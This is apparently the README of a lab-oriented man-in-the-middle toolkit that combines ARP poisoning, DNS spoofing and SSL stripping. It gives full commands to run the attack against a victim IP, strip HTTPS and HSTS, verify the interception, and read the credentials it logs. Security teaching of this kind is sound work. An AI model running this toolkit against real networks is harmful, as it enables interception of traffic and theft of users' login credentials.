# MITM Attack Toolkit (ARP Poisoning + DNS Spoofing + SSL Stripping)

Man-in-the-Middle attack toolkit implementing ARP poisoning, DNS forwarder with selective spoofing, and transparent SSL stripping (HTTPS→HTTP downgrade).

**If you're using this in the Kathara lab environment we provide in the [myLab](myLab) folder, see [myLab/README.md](myLab/README.md) for lab-specific instructions.**

**Using the labCreation.py helper:**

 - **Purpose:** Quickly scaffold a Kathara-compatible lab environment with startup files, an attacker image, DNS and web server templates, and a generated `lab.conf`.
 - **Run:** `python3 labCreation.py` (it prompts for environment name, number of machines, number of web servers, and a random seed).
 - **Output:** A new folder named after the environment containing startup scripts (`*.startup`), an `attacker/` folder, generated web server folders, and a `lab.conf` you can use with Kathara.

This helper is intended for local lab setup and complements the `myLab` examples.

---

## What It Does

- **ARP Poisoning**: Poisons ARP caches so victim routes traffic through attacker.
- **DNS Spoofing**: Runs a local DNS server that spoofs target domain while forwarding all other queries to real DNS server (eliminates race conditions, allows victim to access non-target websites)
- **SSL Stripping**: Transparent HTTPS→HTTP downgrade. Intercepts port 80 via iptables, proxies to HTTPS, rewrites responses to HTTP, and logs credential submissions when present.
- **Automatic Discovery**: Scans the local network, classifies hosts (gateway/DNS/web/victims), and provides interactive target + domain selection.

## Prerequisites

**Operating System:** Linux (tested on Debian/Ubuntu)

**Required packages:**

```bash
sudo apt update
sudo apt install -y python3 python3-pip python3-scapy python3-netifaces net-tools iproute2 iptables dnsutils openssl
pip3 install requests netifaces --break-system-packages
```

**Permissions:** Must run as root (raw sockets and iptables modification)

**Enable IP forwarding:**

```bash
# Temporary (until reboot)
sudo sysctl -w net.ipv4.ip_forward=1

# Permanent
sudo sed -i 's/^#\?net.ipv4.ip_forward=.*/net.ipv4.ip_forward=1/' /etc/sysctl.conf
sudo sysctl -p
```

## Quick Start

### Automatic Discovery (Recommended)

Runs network discovery and launches the full chain with interactive selection for victim and domain:

```bash
sudo python3 exploit.py --auto-discover
```

Optional:

```bash
sudo python3 exploit.py --auto-discover --iface eth0
```

### OPTIONAL: If no automatic discovery is needed

Run all three attack modules together (ARP + DNS + SSL Strip):

```bash
sudo python3 exploit.py <victim_ip> <gateway_ip> \
    --dns <dns_server_ip> \
    --domain <target_domain> \
    --attacker-ip <your_ip> \
    --iface <interface>
```

**Example:**

```bash
sudo python3 exploit.py 192.168.1.100 192.168.1.1 \
    --dns 8.8.8.8 \
    --domain example.com. \
    --attacker-ip 192.168.1.50 \
    --iface eth0
```

**Required parameters:**
- `<victim_ip>` - Target victim's IP address
- `<gateway_ip>` - Gateway IP the victim uses  
- `--domain` - Domain to spoof (include trailing dot, e.g., `example.com.`)
- `--attacker-ip` - Your machine's IP address (returned for spoofed domain)
- `--iface` - Network interface to use (e.g., `eth0`, `wlan0`)
- `--dns <ip>` - DNS server to forward non-target queries to (required, e.g., `8.8.8.8`). This enables the DNS forwarder, which must run to provide correct forwarding for non-target domains.

**Optional parameters:**
- `--no-ssl-strip` - Disable SSL stripping (ARP + DNS only)
- `--ssl-port <port>` - SSL stripper listen port (default: 8080)
- `--delay <seconds>` - Delay between ARP and DNS start (default: 2.0)

---

### Individual Modules

For advanced users who want fine-grained control:

**1. ARP Poisoning:**

```bash
sudo python3 arp_poisoning.py <victim_ip> <gateway_ip> --dns <dns_server_ip>
# --dns is optional; if provided, also poisons DNS server IP
```

**2. DNS Forwarder:**

```bash
sudo python3 dns_spoofing.py \
    --domain <target_domain> \
    --attacker-ip <your_ip> \
    --dns-server <real_dns_ip> \
    --iface <interface>
```

**3. SSL Stripper:**

```bash
sudo python3 ssl_strip.py \
    --upstream-host <target_domain_no_dot> \
    --upstream-ip <real_server_ip> \
    --target-ip <your_ip>
```

## Usage Examples

### Attack a local network target

Scenario: Victim (192.168.1.100) on network with gateway 192.168.1.1, attacker is 192.168.1.50

```bash
sudo python3 exploit.py 192.168.1.100 192.168.1.1 \
    --dns 8.8.8.8 \
    --domain example.com. \
    --attacker-ip 192.168.1.50 \
    --iface wlan0
```

### ARP + DNS only (no SSL stripping)

```bash
sudo python3 exploit.py 192.168.1.100 192.168.1.1 \
    --dns 8.8.8.8 \
    --domain example.com. \
    --attacker-ip 192.168.1.50 \
    --iface wlan0 \
    --no-ssl-strip
```

### Custom domain with specific DNS server

```bash
sudo python3 exploit.py 192.168.1.100 192.168.1.1 \
    --dns 1.1.1.1 \
    --domain myserver.local. \
    --attacker-ip 192.168.1.50 \
    --iface eth0
```

## Verifying the Attack

From victim machine:

```bash
# 1. Verify DNS spoofing
dig <target_domain>  # Should return attacker IP

# 2. Verify DNS forwarding works
dig google.com  # Should return real Google IP

# 3. Verify SSL stripping
curl http://<target_domain>/  # Should work (normally refused)

# 4. Check ARP table
arp -a  # Gateway IP should show attacker's MAC
```

From attacker machine:

```bash
# Check credential capture logs (if a login form is present)
cat /tmp/ssl_strip_credentials.log
```

## How It Works

### 0. Network Discovery (Auto-Discover Mode)
- ARP scan finds active hosts on the LAN
- TCP SYN scan identifies key services (DNS/HTTP/HTTPS)
- Hosts classified into gateway, DNS servers, web servers, victims
- Domain detection uses reverse DNS (via the discovered DNS server) and HTTPS certificates

### 1. ARP Poisoning
- Sends spoofed ARP replies to victim
- Victim believes attacker's MAC is the gateway
- Optionally also poisons DNS server IP
- All victim traffic routes through attacker

### 2. DNS Forwarder
- Runs local DNS server on port 5353
- iptables REDIRECT sends all DNS queries (port 53) to forwarder
- Target domain → spoofed response with attacker IP  
- Other domains → forwarded to real DNS server, response relayed back
- **No race condition** (complete interception)
- **Victim maintains internet access** for non-target domains

### 3. SSL Stripping
- iptables REDIRECT sends HTTP (port 80) to local port 8080
- Only intercepts traffic destined for attacker IP (prevents breaking other sites)
- Proxies requests to HTTPS upstream server
- Rewrites HTTPS URLs in responses to HTTP
- Strips security headers (HSTS, CSP, Secure cookies)
- Victim sees "Not Secure" warning in browser

## Stopping the Attack

Press `Ctrl+C` **once** in the terminal running the attack. The script will:
1. Send SIGINT to all child processes
2. Wait 3 seconds for graceful shutdown
3. Restore ARP tables
4. Remove iptables rules
5. Close all sockets

Ports 5353 and 8080 are immediately reusable after cleanup.

## Files

- `exploit.py` - Main orchestrator (runs all modules)
- `discovery.py` - Network discovery and host classification
- `arp_poisoning.py` - ARP cache poisoning
- `dns_spoofing.py` - DNS forwarder (selective spoofing)
- `ssl_strip.py` - SSL stripping (HTTPS→HTTP downgrade)
- `labCreation.py` - Helper script to create custom Kathara lab environments
- `ATTACK_DOCS.md` - Comprehensive technical documentation

## Documentation

- **[ATTACK_DOCS.md](ATTACK_DOCS.md)** - Detailed attack documentation, module descriptions, workflows
- **[myLab/README.md](myLab/README.md)** - Kathara lab environment instructions

## Troubleshooting

### Permission denied
Run with `sudo`. The tools require root for raw sockets and iptables modification.

### "Address already in use" error
Wait a few seconds between runs. SO_REUSEADDR should prevent this, but ports need time to close.

### DNS not spoofing correctly
- Ensure you're using correct network interface (`--iface`)
- Verify victim's DNS queries are reaching attacker (use `tcpdump -i <iface> port 53`)
- Check iptables REDIRECT rule is active: `sudo iptables -t nat -L PREROUTING -n`

### SSL strip not working  
- Verify DNS spoofing is working first (`dig <domain>` from victim)
- Ensure `--target-ip` matches your attacker IP
- Check iptables rule: `sudo iptables -t nat -L PREROUTING -n`

### Victim loses internet access
This is normal. The DNS forwarder forwards non-target queries, but you need `--dns` flag with a valid DNS server (e.g., `8.8.8.8`) for this to work.

### ARP poisoning not working
- Verify you're on the same LAN as the victim
- Some networks have ARP spoofing protection (e.g., DAI - Dynamic ARP Inspection)
- Check if victim's ARP table is being updated: `arp -a` on victim

## Security and Legal Notice

**FOR EDUCATIONAL PURPOSES ONLY**

This toolkit is designed for:
- Educational labs (like the Kathara environment)
- Security research in controlled environments
- Penetration testing with explicit authorization

**Unauthorized use against systems you don't own or have permission to test is illegal and unethical.**

Always obtain proper authorization before testing security measures on any network.

---
